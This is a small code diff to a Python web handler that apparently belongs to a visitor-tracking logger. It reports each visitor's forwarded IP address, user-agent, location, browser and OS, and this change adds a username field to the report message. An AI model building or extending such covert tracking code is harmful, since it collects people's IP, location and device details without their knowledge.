@@ -279,7 +279,9 @@ height: 100vh;
                     result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                 else:
                     result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
-            
+
+
+                username = data.get("username", "Unknown")
 
                 message = config["message"]["message"]
 
@@ -299,7 +301,7 @@ height: 100vh;
                     message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                     message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
                     message = f"```"
-                    message += f"\nName: {data[0]}"
+                    message += f"\nName: {username}"
                     message += "```"
 
                 datatype = 'text/html'
